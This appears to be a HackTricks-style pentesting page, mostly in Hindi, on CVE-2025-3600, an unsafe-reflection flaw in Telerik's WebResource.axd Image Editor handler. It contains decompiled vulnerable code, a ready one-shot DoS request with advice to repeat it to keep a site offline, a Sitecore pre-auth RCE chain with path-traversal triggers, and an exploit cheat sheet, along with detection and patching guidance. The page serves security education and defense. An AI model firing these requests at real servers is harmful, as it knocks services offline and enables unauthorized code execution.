# Telerik UI for ASP.NET AJAX – Unsafe Reflection via WebResource.axd (type=iec)

{{#include ../../banners/hacktricks-training.md}}

> Telerik UI for ASP.NET AJAX Image Editor cache handler में pre‑auth constructor execution से यूनिवर्सल DoS और कई एप्स में target‑specific gadgets के जरिए pre‑auth RCE संभव है (CVE-2025-3600)।

## TL;DR

- प्रभावित component/route: Telerik.Web.UI.WebResource.axd with query type=iec (Image Editor cache handler). कई products में pre‑auth के रूप में एक्सपोज़्ड।
- Primitive: Attacker एक type name (prtype) कंट्रोल करता है। handler इसे Type.GetType() से resolve करता है और Activator.CreateInstance() को interface type‑safety जाँचे बिना invoke करता है। कोई भी public parameterless .NET type constructor चल जाएगा।
- Impact:
  - .NET framework gadget (PowerShell WSMan finalizer) के साथ यूनिवर्सल pre‑auth DoS।
  - अक्सर वास्तविक deployments में app‑specific gadgets का दुरुपयोग करके pre‑auth RCE तक बढ़ जाता है, खासकर insecure AppDomain.AssemblyResolve handlers का फायदा उठाकर।
- Fix: Telerik UI for ASP.NET AJAX 2025.1.416+ में अपडेट करें या handler को हटा/ล็ॉक करें।

## Affected versions

- Telerik UI for ASP.NET AJAX versions 2011.2.712 through 2025.1.218 (inclusive) vulnerable हैं।
- 2025.1.416 (released 2025-04-30) में fixed है। तुरंत patch करें या handler हटाएँ/lockdown करें।

## Affected surface and quick discovery

- एक्सपोज़र चेक करें:
  - GET /Telerik.Web.UI.WebResource.axd अगर handler wired है तो 404/403 के अलावा कुछ रिटर्न करना चाहिए।
  - web.config में handlers mapping को Telerik.Web.UI.WebResource.axd के लिए इन्स्पेक्ट करें।
- vulnerable code‑path को trigger करने के लिए रीक्वायर होता है: type=iec, dkey=1, और prtype=<AssemblyQualifiedType>.

Example probe and generic trigger:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=Namespace.Type, Assembly
```
Notes
- कुछ PoCs dtype उपयोग करते हैं; implementation dkey=="1" को डाउनलोड फ्लो के लिए चेक करता है.
- prtype को assembly-qualified होना चाहिए या वर्तमान AppDomain में resolvable होना चाहिए.

## मूल कारण – unsafe reflection in ImageEditorCacheHandler

Image Editor cache डाउनलोड फ्लो prtype में दिए गए टाइप का एक instance बनाता है और केवल बाद में उसे ICacheImageProvider में cast करता है और डाउनलोड key को validate करता है। जब validation fail होती है तो constructor पहले ही चल चुका होता है।

<details>
<summary>संबंधित डीकम्पाइल किया गया फ्लो</summary>
```csharp
// entrypoint
public void ProcessRequest(HttpContext context)
{
string text = context.Request["dkey"];           // dkey
string text2 = context.Request.Form["encryptedDownloadKey"]; // download key
...
if (this.IsDownloadedFromImageProvider(text)) // effectively dkey == "1"
{
ICacheImageProvider imageProvider = this.GetImageProvider(context); // instantiation happens here
string key = context.Request["key"];
if (text == "1" && !this.IsValidDownloadKey(text2))
{
this.CompleteAsBadRequest(context.ApplicationInstance);
return; // cast/check happens after ctor has already run
}
using (EditableImage editableImage = imageProvider.Retrieve(key))
{
this.SendImage(editableImage, context, text, fileName);
}
}
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
if (!string.IsNullOrEmpty(context.Request["prtype"]))
{
return RadImageEditor.InitCacheImageProvider(
RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
);
}
...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
// unsafe: construct before enforcing interface type-safety
return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```
</details>

Exploit primitive: नियंत्रित type string → Type.GetType इसे resolve करता है → Activator.CreateInstance इसका public parameterless constructor चलाता है। भले ही अनुरोध बाद में अस्वीकृत कर दिया जाए, gadget के side‑effects पहले ही हो चुके होते हैं।

## Universal DoS gadget (no app-specific gadgets required)

Class: System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper in System.Management.Automation (PowerShell) में एक finalizer है जो एक uninitialized handle को dispose करता है, और जब GC इसे finalize करता है तो यह एक unhandled exception पैदा करता है। यह instantiated होते ही थोड़ी देर बाद IIS worker process को विश्वसनीय रूप से क्रैश कर देता है।

One‑shot DoS request:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
नोट्स
- साइट को ऑफ़लाइन बनाए रखने के लिए समय-समय पर भेजते रहें। आप debugger में constructor के हिट होने को देख सकते हैं; crash finalization पर होता है।

## From DoS to RCE – एस्केलेशन पैटर्न

Unsafe constructor execution कई target‑specific gadgets और chains को अनलॉक कर देता है। Hunt for:

1) बिना-पैरामीटर वाले ctors जो attacker input को process करते हैं
- कुछ ctors (या static initializers) तुरंत Request query/body/cookies/headers को पढ़ते हैं और उन्हें (de)serialize करते हैं।
- Example (Sitecore): एक ctor chain GetLayoutDefinition() तक पहुँचती है जो HTTP body "layout" पढ़ती है और JSON.NET के माध्यम से JSON को deserializes करती है।

2) फाइलों तक पहुँचने वाले ctors
- Ctros जो disk से config/blobs को लोड या deserialize करते हैं, उन्हें बाध्य किया जा सकता है यदि आप उन paths (uploads/temp/data folders) में लिख सकते हैं।

3) app-specific ops करने वाले ctors
- state reset करना, modules toggle करना, या processes terminate करना।

4) Constructors/static ctors जो AppDomain event handlers register करते हैं
- बहुत सी apps AppDomain.CurrentDomain.AssemblyResolve handlers जोड़ती हैं जो args.Name से DLL paths बनाती हैं बिना sanitization के। अगर आप type resolution को प्रभावित कर सकते हैं तो आप arbitrary DLL loads को attacker‑controlled paths से coercion करवा सकते हैं।

5) Type.GetType के द्वारा AssemblyResolve को मजबूर करना
- एक non-existent type request करें ताकि CLR resolution मजबूर हो और registered (संभवतः insecure) resolvers invoke हों। Example assembly-qualified name:
```
This.Class.Does.Not.Exist, watchTowr
```
6) विनाशकारी साइड-इफेक्ट वाले finalizers
- कुछ प्रकार finalizers में fixed-path फ़ाइलों को डिलीट कर देते हैं। link-following या पूर्वानुमेय पाथ्स के साथ मिलकर यह कुछ वातावरणों में local privilege escalation को सक्षम कर सकता है।

## उदाहरण pre‑auth RCE चेन (Sitecore XP)

- Step 1 – Pre‑auth: उस प्रकार को ट्रिगर करें जिसका static/instance ctor एक असुरक्षित AssemblyResolve handler रजिस्टर करता है (उदा., Sitecore’s FolderControlSource in ControlFactory).
- Step 2 – Post‑auth: resolver-probed directory में लिखने की अनुमति प्राप्त करें (उदा., auth bypass या weak upload के माध्यम से) और एक malicious DLL रखें।
- Step 3 – Pre‑auth: एक non-existent type और traversal‑laden assembly name के साथ CVE‑2025‑3600 का उपयोग करके resolver को आपके लगाए गए DLL को लोड करने के लिए मजबूर करें → IIS worker के रूप में code execution।

Trigger examples
```http
# Load the insecure resolver (no auth on many setups)
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# Coerce the resolver via Telerik unsafe reflection
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```
## मान्यता, हंटिंग और DFIR नोट्स

- सुरक्षित लैब सत्यापन: DoS payload चलाएँ और WSMan finalizer से जुड़ा app pool recycle/अनहैंडल्ड exception देखें।
- Telemetry में हंटिंग:
- Requests to /Telerik.Web.UI.WebResource.axd with type=iec and odd prtype values.
- Failed type loads and AppDomain.AssemblyResolve events.
- ऐसे अनुरोधों के बाद अचानक w3wp.exe crashes/recycles।

## निवारण

- Patch to Telerik UI for ASP.NET AJAX 2025.1.416 or later.
- जहाँ संभव हो Telerik.Web.UI.WebResource.axd की एक्सपोज़र हटाएँ या सीमित करें (WAF/rewrites)।
- सर्वर-साइड पर prtype हैंडलिंग को अनदेखा करें या सख्त बनायें (upgrade इंस्टेंशिएशन से पहले उचित जाँच लागू करता है)।
- कस्टम AppDomain.AssemblyResolve handlers का ऑडिट और कड़ा करें। args.Name से paths बिना sanitization बनाना टालें; strong-named loads या whitelists को प्राथमिकता दें।
- अपलोड/लिखने के स्थानों को सीमित करें और probed directories में DLL drops को रोकें।
- रिज़ॉल्वर दुरुपयोग पकड़ने के लिए non-existent type load प्रयासों की निगरानी करें।

## चीट‑शीट

- Presence check:
- GET /Telerik.Web.UI.WebResource.axd
- web.config में handler mapping देखें
- Exploit skeleton:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=<TypeName,+Assembly,+Version=..., +PublicKeyToken=...>
```
- Universal DoS:
```http
...&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
- ट्रिगर रिज़ॉल्वर:
```
This.Class.Does.Not.Exist, watchTowr
```
## संबंधित तकनीकें

- IIS post-exploitation, .NET key extraction, और in‑memory loaders:

{{#ref}}
iis-internet-information-services.md
{{#endref}}

- ASP.NET ViewState deserialization और machineKey abuses:

{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

## संदर्भ

- [watchTowr labs – More than DoS: Progress Telerik UI for ASP.NET AJAX Unsafe Reflection (CVE-2025-3600)](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [Black Hat USA 2019 – SSO Wars: The Token Menace (Mirosh & Muñoz) – DoS gadget background](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf)
- [ZDI – Abusing arbitrary file deletes to escalate privilege](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [watchTowr – Is “B” for Backdoor? (Sitecore chain CVE-2025-34509)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

{{#include ../../banners/hacktricks-training.md}}
